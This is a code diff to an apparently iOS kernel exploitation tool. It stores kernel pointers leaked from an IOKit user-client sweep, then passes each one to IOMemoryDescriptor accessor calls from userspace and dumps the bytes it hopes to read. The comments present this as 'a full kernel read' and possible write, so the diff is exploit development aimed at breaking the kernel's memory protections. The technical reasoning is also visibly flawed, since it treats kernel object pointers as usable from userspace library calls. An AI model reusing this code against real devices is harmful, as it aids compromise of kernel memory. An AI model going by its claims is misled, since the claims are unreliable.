@@ -29,6 +29,14 @@
  * OUTPUT: Documents/kern_leak.log (durable, fsync per hit) + the UI log.
  */
 #import <IOKit/IOKitLib.h>
+
+/* The iOS SDK does not declare the IOMemoryDescriptor accessors (they are
+ * macOS-only in the public headers), but the symbols exist in libIOKit.
+ * Declared weak: a missing symbol is then reported at runtime instead of
+ * breaking the build. */
+typedef struct IOMemoryDescriptor IOMemoryDescriptor;
+extern void    *IOMemoryDescriptorGetAddress(IOMemoryDescriptor *) __attribute__((weak));
+extern uint64_t IOMemoryDescriptorGetLength(IOMemoryDescriptor *) __attribute__((weak));
 #include <stdio.h>
 #include <string.h>
 #include <stdint.h>
@@ -87,6 +95,15 @@ static uint32_t  g_kl_nconns;
 static uint32_t  g_kl_hits;
 static uint32_t  g_kl_calls;
 
+/* The hits are kept so a later step can try to turn a leaked pointer into
+ * a mapping: IOMemoryDescriptorGetAddress() on an IOMemoryDescriptor*
+ * returns the userspace address of the kernel memory it describes, which
+ * is a full kernel read. */
+#define KL_MAX_SAVED 8
+static uint64_t g_kl_saved[KL_MAX_SAVED];
+static char     g_kl_saved_ctx[KL_MAX_SAVED][96];
+static uint32_t g_kl_nsaved;
+
 #define KL_KERNEL_LO 0xfffffff000000000ULL
 #define KL_KERNEL_HI 0xffffffff00000000ULL
 
@@ -115,6 +132,12 @@ static void kl_report(const char *svc, uint32_t type, uint32_t sel, const char *
     g_kl_hits++;
     klf("[KL] %s type=%u sel=%u %s shape=%s out_off=0x%zx VALUE=0x%016llx",
         svc, type, sel, tag, shape, off, (unsigned long long)v);
+    if (g_kl_nsaved < KL_MAX_SAVED) {
+        g_kl_saved[g_kl_nsaved] = v;
+        snprintf(g_kl_saved_ctx[g_kl_nsaved], sizeof(g_kl_saved_ctx[0]),
+                 "%s type=%u sel=%u %s off=0x%zx", svc, type, sel, tag, off);
+        g_kl_nsaved++;
+    }
     /* dump a window around the hit so the layout can be reconstructed */
     size_t base = (off >= 0x20) ? (off - 0x20) : 0;
     size_t end = (off + 0x28 <= n) ? (off + 0x28) : n;
@@ -329,6 +352,68 @@ static void kl_iogpu_group(void)
         klf("[KL] group handle command sweep done (calls=%u hits=%u)", g_kl_calls, g_kl_hits);
     }
     IOServiceClose(conn);
+}
+
+
+/* TURN A LEAK INTO A MAPPING.
+ *
+ * A user client method that returns an IOMemoryDescriptor* hands back a
+ * pointer to a kernel object that describes kernel memory. Calling
+ * IOMemoryDescriptorGetAddress() on it returns the userspace address the
+ * kernel already mapped for us, and IOMemoryDescriptorGetLength() the
+ * size - that is a full kernel read (and a write if the descriptor is
+ * writable). No leak required beyond the pointer itself.
+ *
+ * Risk: calling a method on a pointer that is not an IOMemoryDescriptor
+ * dereferences a random kernel object. The hits are tried one at a time
+ * and the result is logged immediately, so a panic still tells us which
+ * pointer was the object.
+ */
+
+void nk_kern_map_try(void)
+{
+    nk_doc_log_open("kern_leak.log");
+    klf("[KM] === kernel mapping attempt: saved=%u ===", g_kl_nsaved);
+    if (!g_kl_nsaved) {
+        klf("[KM] no saved leak - run the kernel leak hunt first");
+        return;
+    }
+    for (uint32_t i = 0; i < g_kl_nsaved; i++) {
+        uint64_t raw = g_kl_saved[i];
+        uint64_t kp = raw & KL_PAC_MASK;
+        klf("[KM] [%u] %s raw=0x%016llx", i, g_kl_saved_ctx[i], (unsigned long long)raw);
+        if (!IOMemoryDescriptorGetAddress || !IOMemoryDescriptorGetLength) {
+            klf("[KM] libIOKit does not export the IOMemoryDescriptor accessors "
+                "on this build - the pointer cannot be mapped from userspace");
+            return;
+        }
+        void *addr = IOMemoryDescriptorGetAddress((IOMemoryDescriptor *)kp);
+        if (!addr) {
+            klf("[KM] [%u] IOMemoryDescriptorGetAddress -> NULL (not a memory descriptor?)", i);
+            continue;
+        }
+        uint64_t len = IOMemoryDescriptorGetLength((IOMemoryDescriptor *)kp);
+        klf("[KM] [%u] *** MAPPED at %p length=0x%llx", i, addr, (unsigned long long)len);
+        /* read a window and dump it - kernel text/heap looks like this */
+        uint8_t buf[256];
+        memset(buf, 0, sizeof(buf));
+        memcpy(buf, addr, sizeof(buf));
+        for (uint32_t r = 0; r < sizeof(buf); r += 16) {
+            char line[128];
+            int n = 0;
+            for (uint32_t c = 0; c < 16; c++)
+                n += snprintf(line + n, sizeof(line) - n, "%02x", buf[r + c]);
+            klf("[KM] [%u] +0x%03x %s", i, r, line);
+        }
+        /* also look for a printable kernel string */
+        for (uint32_t r = 0; r < sizeof(buf) - 8; r++) {
+            if (buf[r] == '/' && buf[r+1] == 'S' && buf[r+2] == 'y' && buf[r+3] == 's') {
+                klf("[KM] [%u] +0x%03x looks like a kernel path", i, r);
+                break;
+            }
+        }
+    }
+    klf("[KM] === done ===");
 }
 
 void nk_kernel_leak_hunt(void)
